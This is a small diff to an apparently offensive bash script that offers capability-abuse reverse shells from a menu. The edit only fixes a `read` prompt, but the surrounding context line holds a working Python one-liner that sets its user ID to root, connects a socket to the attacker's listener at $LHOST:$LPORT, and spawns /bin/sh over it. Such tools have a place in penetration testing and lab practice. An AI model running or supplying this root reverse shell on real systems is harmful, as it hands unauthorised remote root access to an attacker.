@@ -179,7 +179,7 @@ while true; do
             select choice in $RevShellCap "Go Back"; do
                 case "$choice" in
                     *python*)
-                        read "Set up your listener at $LHOST:$LPORT then press enter"
+                        read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
                         "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
                         ;;
                     "Go Back")
